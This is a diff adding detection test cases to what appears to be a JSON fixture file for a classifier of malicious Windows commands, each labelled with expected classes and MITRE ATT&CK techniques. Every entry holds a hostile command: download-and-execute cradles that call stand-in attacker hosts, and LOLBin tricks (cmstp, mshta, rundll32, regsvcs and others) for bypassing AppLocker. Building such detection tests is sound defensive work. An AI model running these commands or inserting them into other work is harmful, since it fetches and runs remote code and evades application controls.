@@ -42,5 +42,209 @@
       "techniques": ["T1197"]
     },
     "reject": {"classes": ["impact", "credential_theft"]}
+  },
+  {
+    "id": "forfiles-proxy-exec",
+    "description": "forfiles /C used to proxy-execute calc.exe — LOLBin AppLocker bypass technique",
+    "source": "LOLBAS Project https://lolbas-project.github.io/lolbas/Binaries/Forfiles/",
+    "command": "forfiles /p C:\\Windows\\System32 /m notepad.exe /c \"cmd /c C:\\Windows\\Temp\\malware.exe\"",
+    "expect": {
+      "classes": ["loader"],
+      "min_confidence": {"loader": "medium"},
+      "techniques": ["T1218"]
+    },
+    "reject": {"classes": ["impact", "credential_theft"]}
+  },
+  {
+    "id": "pcalua-lolbin-exec",
+    "description": "pcalua.exe -a used to launch arbitrary binary — LOLBin UAC bypass",
+    "source": "LOLBAS Project https://lolbas-project.github.io/lolbas/Binaries/Pcalua/",
+    "command": "pcalua.exe -a C:\\Windows\\Temp\\payload.exe -d C:\\Windows\\System32",
+    "expect": {
+      "classes": ["loader"],
+      "min_confidence": {"loader": "medium"},
+      "techniques": ["T1218"]
+    },
+    "reject": {"classes": ["impact", "credential_theft"]}
+  },
+  {
+    "id": "cmstp-applocker-bypass",
+    "description": "cmstp.exe loading remote INF scriptlet to bypass AppLocker and execute code",
+    "source": "LOLBAS Project https://lolbas-project.github.io/lolbas/Binaries/Cmstp/ ; MITRE ATT&CK T1218.003",
+    "command": "cmstp.exe /s /ns hxxp://c2.evildomain[.]xyz/payload.inf",
+    "expect": {
+      "classes": ["loader"],
+      "min_confidence": {"loader": "high"},
+      "techniques": ["T1218.003"]
+    },
+    "reject": {"classes": ["impact", "credential_theft"]}
+  },
+  {
+    "id": "odbcconf-dll-load",
+    "description": "odbcconf.exe /f loading response file that registers a malicious DLL",
+    "source": "LOLBAS Project https://lolbas-project.github.io/lolbas/Binaries/Odbcconf/ ; MITRE ATT&CK T1218.008",
+    "command": "odbcconf.exe /f C:\\Users\\Public\\payload.rsp",
+    "expect": {
+      "classes": ["loader"],
+      "min_confidence": {"loader": "high"},
+      "techniques": ["T1218.008"]
+    },
+    "reject": {"classes": ["impact", "credential_theft"]}
+  },
+  {
+    "id": "bash-exe-wsl-lolbin",
+    "description": "bash.exe -c on Windows used to execute curl pipe to bash — WSL LOLBin indirect execution",
+    "source": "LOLBAS Project https://lolbas-project.github.io/lolbas/Binaries/Bash/ ; MITRE ATT&CK T1202",
+    "command": "bash.exe -c \"curl hxxp://c2.attacker[.]xyz/implant.sh | bash\"",
+    "expect": {
+      "classes": ["loader", "dropper"],
+      "min_confidence": {"loader": "medium", "dropper": "high"},
+      "techniques": ["T1202", "T1105"]
+    },
+    "reject": {"classes": ["impact", "credential_theft"]}
+  },
+  {
+    "id": "msiexec-remote-msi",
+    "description": "msiexec /i loading remote MSI payload over HTTP — common TA505 and Lazarus delivery",
+    "source": "MITRE ATT&CK T1218.007 ; CISA AA20-266A",
+    "command": "msiexec.exe /i hxxp://cdn.pkg-update[.]xyz/setup.msi /quiet /qn TRANSFORMS=evil.mst",
+    "expect": {
+      "classes": ["loader"],
+      "min_confidence": {"loader": "high"},
+      "techniques": ["T1218.007"]
+    },
+    "reject": {"classes": ["impact", "credential_theft"]}
+  },
+  {
+    "id": "start-bitstransfer-dropper",
+    "description": "Start-BitsTransfer PowerShell cmdlet downloads remote EXE — BITS-based dropper",
+    "source": "MITRE ATT&CK T1197 ; Secureworks CTU blog 2022",
+    "command": "Start-BitsTransfer -Source hxxp://cdn.malicious-updates[.]xyz/svchost32.exe -Destination C:\\Windows\\Temp\\svchost32.exe; Start-Process C:\\Windows\\Temp\\svchost32.exe",
+    "expect": {
+      "classes": ["dropper"],
+      "min_confidence": {"dropper": "high"},
+      "techniques": ["T1197"]
+    },
+    "reject": {"classes": ["impact", "credential_theft"]}
+  },
+  {
+    "id": "iwr-download-cradle",
+    "description": "Invoke-WebRequest download cradle — PowerShell downloads and immediately executes PE",
+    "source": "MITRE ATT&CK T1105 ; Red Canary Threat Detection Report 2023",
+    "command": "Invoke-WebRequest -Uri hxxp://cdn.pkg-delivery[.]xyz/agent.exe -OutFile $env:TEMP\\agent.exe; & $env:TEMP\\agent.exe",
+    "expect": {
+      "classes": ["dropper", "defense_evasion"],
+      "min_confidence": {"dropper": "high"},
+      "techniques": ["T1105"]
+    },
+    "reject": {"classes": ["impact", "credential_theft"]}
+  },
+  {
+    "id": "clickfix-rundll32-js",
+    "description": "ClickFix variant using rundll32 javascript: scheme to execute inline script — AppLocker bypass",
+    "source": "Proofpoint ClickFix campaign analysis 2024; MITRE ATT&CK T1218.011",
+    "command": "rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";document.write();new%20ActiveXObject(\"WScript.Shell\").Run(\"powershell -ep bypass -w hidden -c IEX((New-Object Net.WebClient).DownloadString('hxxp://c2[.]xyz/a'))\",0,true);",
+    "expect": {
+      "classes": ["loader", "dropper", "defense_evasion"],
+      "min_confidence": {"loader": "high", "dropper": "high"},
+      "techniques": ["T1218.011", "T1105"]
+    },
+    "reject": {"classes": ["impact", "credential_theft"]}
+  },
+  {
+    "id": "clickfix-wscript-vbs",
+    "description": "ClickFix lure drops VBScript and executes with wscript.exe — TA577 initial access",
+    "source": "Proofpoint ClickFix campaign analysis 2024; MITRE ATT&CK T1059.005",
+    "command": "wscript.exe C:\\Users\\Public\\WindowsUpdate.vbs",
+    "expect": {
+      "classes": ["loader"],
+      "min_confidence": {"loader": "medium"},
+      "techniques": ["T1059.005"]
+    },
+    "reject": {"classes": ["impact", "credential_theft"]}
+  },
+  {
+    "id": "clickfix-cscript-js",
+    "description": "ClickFix variant runs JScript payload via cscript.exe — bypasses PowerShell restrictions",
+    "source": "Proofpoint ClickFix campaign analysis 2024; MITRE ATT&CK T1059.007",
+    "command": "cscript.exe //nologo //e:jscript C:\\Users\\Public\\update.js",
+    "expect": {
+      "classes": ["loader"],
+      "min_confidence": {"loader": "medium"},
+      "techniques": ["T1059.007"]
+    },
+    "reject": {"classes": ["impact", "credential_theft"]}
+  },
+  {
+    "id": "wsl-exec-lolbin-curl",
+    "description": "wsl.exe --exec bash used to run curl on Windows, evading Windows AV scanning",
+    "source": "LOLBAS Project https://lolbas-project.github.io/lolbas/Binaries/Wsl/ ; MITRE ATT&CK T1202",
+    "command": "wsl.exe --exec bash -c \"curl hxxp://c2.attacker[.]xyz/beacon.sh | bash\"",
+    "expect": {
+      "classes": ["loader", "dropper"],
+      "min_confidence": {"loader": "medium", "dropper": "high"},
+      "techniques": ["T1202", "T1105"]
+    },
+    "reject": {"classes": ["impact", "credential_theft"]}
+  },
+  {
+    "id": "diskshadow-exec-lolbin",
+    "description": "diskshadow exec command used as LOLBin to run arbitrary executables — AppLocker bypass",
+    "source": "LOLBAS Project https://lolbas-project.github.io/lolbas/Binaries/Diskshadow/ ; MITRE ATT&CK T1490",
+    "command": "diskshadow.exe /s C:\\Windows\\Temp\\shadow.txt",
+    "expect": {
+      "classes": ["impact"],
+      "min_confidence": {"impact": "medium"},
+      "techniques": ["T1490"]
+    },
+    "reject": {"classes": ["credential_theft"]}
+  },
+  {
+    "id": "regsvcs-dotnet-assembly",
+    "description": "regsvcs.exe loading a .NET assembly DLL — LOLBin bypasses application whitelisting",
+    "source": "LOLBAS Project https://lolbas-project.github.io/lolbas/Binaries/Regsvcs/ ; MITRE ATT&CK T1218.009",
+    "command": "C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\regsvcs.exe C:\\Users\\Public\\payload.dll",
+    "expect": {
+      "classes": ["loader"],
+      "min_confidence": {"loader": "high"},
+      "techniques": ["T1218.009"]
+    },
+    "reject": {"classes": ["impact", "credential_theft"]}
+  },
+  {
+    "id": "regasm-dotnet-assembly",
+    "description": "regasm.exe registering a malicious .NET COM assembly — LOLBin code execution",
+    "source": "LOLBAS Project https://lolbas-project.github.io/lolbas/Binaries/Regasm/ ; MITRE ATT&CK T1218.009",
+    "command": "regasm.exe /u C:\\Windows\\Temp\\malicious.dll",
+    "expect": {
+      "classes": ["loader"],
+      "min_confidence": {"loader": "high"},
+      "techniques": ["T1218.009"]
+    },
+    "reject": {"classes": ["impact", "credential_theft"]}
+  },
+  {
+    "id": "mshta-remote-url-dropper",
+    "description": "mshta.exe loading remote HTA payload over HTTP — direct URL execution without javascript: scheme",
+    "source": "MITRE ATT&CK T1218.005 ; Red Canary Threat Detection Report 2023",
+    "command": "mshta.exe hxxp://cdn.evil-delivery[.]xyz/WindowsUpdate.hta",
+    "expect": {
+      "classes": ["dropper"],
+      "min_confidence": {"dropper": "high"},
+      "techniques": ["T1218.005"]
+    },
+    "reject": {"classes": ["impact", "credential_theft"]}
+  },
+  {
+    "id": "pwsh-bypass-execution",
+    "description": "PowerShell Core (pwsh) used with execution policy bypass — may evade policies targeting powershell.exe",
+    "source": "MITRE ATT&CK T1059.001 ; Red Canary 2023",
+    "command": "pwsh -ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -Command \"IEX((New-Object Net.WebClient).DownloadString('hxxps://c2[.]xyz/agent.ps1'))\"",
+    "expect": {
+      "classes": ["loader", "dropper", "defense_evasion"],
+      "min_confidence": {"loader": "high", "dropper": "high", "defense_evasion": "medium"},
+      "techniques": ["T1059.001", "T1105"]
+    },
+    "reject": {"classes": ["impact", "credential_theft"]}
   }
 ]
